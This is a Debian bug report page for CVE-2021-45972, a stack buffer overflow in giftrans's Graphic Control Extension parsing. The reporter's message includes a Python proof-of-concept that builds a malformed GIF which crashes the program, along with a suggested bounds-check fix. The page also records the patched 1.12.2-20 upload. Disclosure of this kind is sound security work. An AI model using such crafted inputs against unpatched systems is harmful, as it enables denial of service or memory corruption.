
# Debian Bug report logs - #1002739 giftrans: CVE-2021-45972: Stack based buffer overflow in the giftrans function

[![version graph](version.cgi?absolute=0;package=giftrans;found=giftrans%2F1.12.2-19;height=2;fixed=giftrans%2F1.12.2-20;width=2;collapse=1)](version.cgi?collapse=1;fixed=giftrans%2F1.12.2-20;info=1;absolute=0;package=giftrans;found=giftrans%2F1.12.2-19)

Package:
[giftrans](pkgreport.cgi?package=giftrans);
Maintainer for [giftrans](pkgreport.cgi?package=giftrans) is [Debian QA Group <packages@qa.debian.org>](pkgreport.cgi?maint=packages%40qa.debian.org); Source for [giftrans](pkgreport.cgi?package=giftrans) is [src:giftrans](pkgreport.cgi?src=giftrans) ([PTS](https://tracker.debian.org/pkg/giftrans), [buildd](https://buildd.debian.org/giftrans), [popcon](https://qa.debian.org/popcon.php?package=giftrans)).

Reported by: [Kolja Grassmann <koljagrassmann@mailbox.org>](pkgreport.cgi?submitter=koljagrassmann%40mailbox.org)

Date: Tue, 28 Dec 2021 16:18:01 UTC

Severity: important

Tags: security

Found in version giftrans/1.12.2-19

Fixed in version giftrans/1.12.2-20

**Done:** David da Silva Polverari <polverari@debian.org>

Bug is archived. No further changes may be made.

Display info messages

View this report as an [mbox folder](bugreport.cgi?bug=1002739;mbox=yes), [status mbox](bugreport.cgi?bug=1002739;mbox=yes;mboxstatus=yes), [maintainer mbox](bugreport.cgi?bug=1002739;mbox=yes;mboxmaint=yes)

---

**Report forwarded**
to `debian-bugs-dist@lists.debian.org, Debian QA Group <packages@qa.debian.org>`:

`Bug#1002739`; Package `giftrans`.
(Tue, 28 Dec 2021 16:18:03 GMT) ([full text](bugreport.cgi?bug=1002739;msg=2), [mbox](bugreport.cgi?bug=1002739;mbox=yes;msg=2), [link](#1)).

---

**Acknowledgement sent**
to `Kolja Grassmann <koljagrassmann@mailbox.org>`:

New Bug report received and forwarded. Copy sent to `Debian QA Group <packages@qa.debian.org>`.
(Tue, 28 Dec 2021 16:18:03 GMT) ([full text](bugreport.cgi?bug=1002739;msg=4), [mbox](bugreport.cgi?bug=1002739;mbox=yes;msg=4), [link](#3)).

---

[Message #5](#5) received at submit@bugs.debian.org ([full text](bugreport.cgi?bug=1002739;msg=5), [mbox](bugreport.cgi?bug=1002739;mbox=yes;msg=5), reply):

![](/cgi-bin/libravatar.cgi?email=koljagrassmann%40mailbox.org)
From: Kolja Grassmann <koljagrassmann@mailbox.org>
To: Debian Bug Tracking System <submit@bugs.debian.org>
Subject: giftrans: Stack based buffer overflow in the giftrans function
Date: Tue, 28 Dec 2021 17:15:35 +0100 (CET)
```
Package: giftrans
Version: 1.12.2-19+b1
Severity: important
Tags: security

Dear Maintainer,

There is a stack based buffer overflow in the giftrans function of the giftrans application. The responsible source code looks as follows:

int giftrans(src,dest)
FILE    *src;
FILE    *dest;
{
        unsigned char   buffer[3*256],lsd[7],gct[3*256],gce[5];
[...]
        case 0xf9:      /* Graphic Control Extension */
                if (verbose)
                        (void)fprintf(stderr,"Graphic Control Extension:\n");
                (void)fread((void *)(buffer+2),1,1,src);
                size=buffer[2];
                (void)fread((void *)gce,size,1,src);

The problem here is, that the size value is read from the image file and then size bytes are written into a buffer of size 5. I wrote the following script to test this:

#!/bin/python3

# Writing to poc.gif
f = open("poc.gif", "wb")

sig = b"GIF87a"
w = b"\x10\x00"
h = b"\x10\x00"
flags_one = b"\x00"
bcolor = b"\x01"
aspect = b"\x01"

data = sig + w + h + flags_one + bcolor + aspect
f.write(data)

id = b"\x21"
val = b"\xf9"
size = b"\xff"
buffer_overflow = b"A"*255
data = id + val + size + buffer_overflow
f.write(data)

f.write(b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")

f.close()

The script generates a poc.gif file. Using this file on Debian 10 with the current version of giftrans does lead to a crash because a buffer overflow is detected:
$ giftrans -c test -o /dev/null poc.gif
*** buffer overflow detected ***: giftrans terminated
Abgebrochen

To address this issue I added a length check to the code locally:

case 0xf9:      /* Graphic Control Extension */
        if (verbose)
                (void)fprintf(stderr,"Graphic Control Extension:\n");
        (void)fread((void *)(buffer+2),1,1,src);
        size=buffer[2];
        if (size > 5) {
                return 1;
                }
        (void)fread((void *)gce,size,1,src);

Best regards
Kolja

-- System Information:
Debian Release: 10.11
  APT prefers oldstable-updates
  APT policy: (500, 'oldstable-updates'), (500, 'oldstable')
Architecture: amd64 (x86_64)

Kernel: Linux 4.19.0-18-amd64 (SMP w/8 CPU cores)
Kernel taint flags: TAINT_OOT_MODULE, TAINT_UNSIGNED_MODULE
Locale: LANG=de_DE.UTF-8, LC_CTYPE=de_DE.UTF-8 (charmap=UTF-8), LANGUAGE=de_DE.UTF-8 (charmap=UTF-8)
Shell: /bin/sh linked to /usr/bin/dash
Init: systemd (via /run/systemd/system)
LSM: AppArmor: enabled

Versions of packages giftrans depends on:
ii  libc6       2.28-10
ii  x11-common  1:7.7+19

giftrans recommends no packages.

giftrans suggests no packages.

-- no debconf information

```

---

**Changed Bug title to 'giftrans: CVE-2021-45972: Stack based buffer overflow in the giftrans function' from 'giftrans: Stack based buffer overflow in the giftrans function'.**
Request was from `Salvatore Bonaccorso <carnil@debian.org>`
to `control@bugs.debian.org`.
(Sun, 02 Jan 2022 08:00:02 GMT) ([full text](bugreport.cgi?bug=1002739;msg=7), [mbox](bugreport.cgi?bug=1002739;mbox=yes;msg=7), [link](#6)).

---

**Reply sent**
to `David da Silva Polverari <polverari@debian.org>`:

You have taken responsibility.
(Fri, 13 Oct 2023 22:15:03 GMT) ([full text](bugreport.cgi?bug=1002739;msg=9), [mbox](bugreport.cgi?bug=1002739;mbox=yes;msg=9), [link](#8)).

---

**Notification sent**
to `Kolja Grassmann <koljagrassmann@mailbox.org>`:

Bug acknowledged by developer.
(Fri, 13 Oct 2023 22:15:04 GMT) ([full text](bugreport.cgi?bug=1002739;msg=11), [mbox](bugreport.cgi?bug=1002739;mbox=yes;msg=11), [link](#10)).

---

[Message #12](#12) received at 1002739-close@bugs.debian.org ([full text](bugreport.cgi?bug=1002739;msg=12), [mbox](bugreport.cgi?bug=1002739;mbox=yes;msg=12), reply):

![](/cgi-bin/libravatar.cgi?email=ftpmaster%40ftp-master.debian.org)
From: Debian FTP Masters <ftpmaster@ftp-master.debian.org>
To: 1002739-close@bugs.debian.org
Subject: Bug#1002739: fixed in giftrans 1.12.2-20
Date: Fri, 13 Oct 2023 22:13:04 +0000
```
Source: giftrans
Source-Version: 1.12.2-20
Done: David da Silva Polverari <polverari@debian.org>

We believe that the bug you reported is fixed in the latest version of
giftrans, which is due to be installed in the Debian FTP archive.

A summary of the changes between this version and the previous one is
attached.

Thank you for reporting the bug, which will now be closed.  If you
have further comments please address them to 1002739@bugs.debian.org,
and the maintainer will reopen the bug report if appropriate.

Debian distribution maintenance software
pp.
David da Silva Polverari <polverari@debian.org> (supplier of updated giftrans package)

(This message was generated automatically at their request; if you
believe that there is a problem with it please contact the archive
administrators by mailing ftpmaster@ftp-master.debian.org)

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

Format: 1.8
Date: Fri, 13 Oct 2023 21:33:05 +0000
Source: giftrans
Architecture: source
Version: 1.12.2-20
Distribution: unstable
Urgency: medium
Maintainer: Debian QA Group <packages@qa.debian.org>
Changed-By: David da Silva Polverari <polverari@debian.org>
Closes: [928899](bugreport.cgi?bug=928899) [1002739](bugreport.cgi?bug=1002739)
Changes:
 giftrans (1.12.2-20) unstable; urgency=medium
 .
   * QA upload.
   * Ran wrap-and-sort.
   * Using new DH level format. Consequently:
       - debian/compat: removed.
       - debian/control: changed from 'debhelper' to 'debhelper-compat' in
         Build-Depends field and bumped level to 13.
   * debian/control
       - Added 'Rules-Requires-Root: no' to source stanza.
       - Bumped Standards-Version to 4.6.2.
       - Updated Homepage field with latest Internet Archive snapshot link.
       - Updated Vcs-* fields.
   * debian/copyright:
       - Fixed Source field using the latest Internet Archive snapshot link.
       - Fixed Upstream-Contact field.
       - Updated packaging copyright years.
   * debian/gbp.conf: added minimal configuration to document the repository
     layout.
   * debian/patches/:
       - Updated all previous header information in accordance with DEP-3.
       - 31_fix_spelling_error.diff: created to fix a typo in upstream source.
       - 32_fix_sbo_giftrans.diff: created to fix a buffer overflow. Thanks to
         Kolja Grassmann <koljagrassmann@mailbox.org>. (Closes: #[1002739](bugreport.cgi?bug=1002739))
   * debian/rules: included dpkg's buildtools.mk to fix FTCBFS. Thanks to Helmut
     Grohne <helmut@subdivi.de>. (Closes: #[928899](bugreport.cgi?bug=928899))
   * debian/salsa-ci.yml: added to provide CI tests for Salsa.
   * debian/tests/control: created to perform a superficial test.
   * debian/watch: bumped to version 4.
Checksums-Sha1:
 64f80fe9f431947183d6600a12b7923c9e0f4082 1921 giftrans_1.12.2-20.dsc
 a2113addd5f94052c4731fef57715315bf55f672 8080 giftrans_1.12.2-20.debian.tar.xz
 563cb6f5c0f7367b1a6002d2e27a08fdb2f59a2e 5643 giftrans_1.12.2-20_source.buildinfo
Checksums-Sha256:
 6c853c83fe0618726c5d943b8cffe441ca1faa1d6ba8cfaa680c68672826ed0a 1921 giftrans_1.12.2-20.dsc
 bcb560382d71c427ba1ddf1ba836a63eb6ca1a947ffc73db2a95524c7f0e3890 8080 giftrans_1.12.2-20.debian.tar.xz
 506a04fcbd0509fd359fd2604ed6985707c9f881cf2d242191120dfe7d12cac3 5643 giftrans_1.12.2-20_source.buildinfo
Files:
 eb172c5d817eebf97e4da353d73ef983 1921 graphics optional giftrans_1.12.2-20.dsc
 6589f5f5b20123411793ff2968097468 8080 graphics optional giftrans_1.12.2-20.debian.tar.xz
 7dd2c2cead7169232d61a755bd42acfc 5643 graphics optional giftrans_1.12.2-20_source.buildinfo

-----BEGIN PGP SIGNATURE-----

iQIzBAEBCAAdFiEEDTUunGhzKyZWj9leHIjoaIRpgN4FAmUpunMACgkQHIjoaIRp
gN4SPhAAlDmQkTh3v2NhoBdw+DmTFeSZQ9k/9RVXG4QsT3mQWnfmU/z2BTj9fBhf
EpGTEOtOvbgrmuTkN7F3sJPgS2H2OQNp9rO1UBYoArZvKCtTy6W6ajYTRePm0GYF
uRVlixuvB18mGUuGOoGYUvoLJEoX9JR4QywgiZ6orrdeerURt/3+05XBzPYiflbi
VnhWIhvhetveXNsZ5z7qns0YtW3yAqQ9XwKlnxpjkKwgC4eOipNwlpJEoOkTLMnd
mhTsu44BzrmcqgJjYAN0xCF96tDJhJTw7IuQqKTw/4QPASTS1CZe7eYqUrkgV6sf
3GkFrSxT2XaWIAcDpD7t83K5qn0N3XLW6PBqWqOMbxAB2OTwlTXwasvSyPkrW7GR
f6OX4VelXuIV19GT9JxPj720ydXTEcORzXd4HtOXweG1vyEOqtMXfZvET57d3lC1
vyF+UubAi8zGiu5YrO79IFqPvuSC/tJciybUVaUCG83L/1cmemuesWLJn1v0K4gg
CNe3AvRvKdjm7Elj8OyT5sb8BuVbmrSiM/DDqKEHAPZ/SoEqibXvanvPLYX7+Uji
n7CeUs2QotrdYnInYcoroD1uaMvQHNxPUQHoDYxXjhVnuzvutfN/TJ6rBldzbyxK
dc6noCyLsveTuDkY73Ev+rT9q3nF9u8XP50VmCX3Gh038PpQcJ4=
=f+Ln
-----END PGP SIGNATURE-----

```

---

**Bug archived.**
Request was from `Debbugs Internal Request <owner@bugs.debian.org>`
to `internal_control@bugs.debian.org`.
(Thu, 16 Nov 2023 07:27:36 GMT) ([full text](bugreport.cgi?bug=1002739;msg=14), [mbox](bugreport.cgi?bug=1002739;mbox=yes;msg=14), [link](#13)).

---

Send a report that [this bug log contains spam](https://bugs.debian.org/cgi-bin/bugspam.cgi?bug=1002739).

---

Debian bug tracking system administrator <owner@bugs.debian.org>.
Last modified:
Sun Jan 5 16:09:33 2025;
Machine Name:
bembo

[Debian Bug tracking system](https://www.debian.org/Bugs/)

Debbugs is free software and licensed under the terms of the GNU General
Public License version 2. The current version can be obtained
from <https://bugs.debian.org/debbugs-source/>.

Copyright Â© 1999 Darren O. Benham,
1997,2003 nCipher Corporation Ltd,
1994-97 Ian Jackson,
2005-2017 Don Armstrong, and many other contributors.

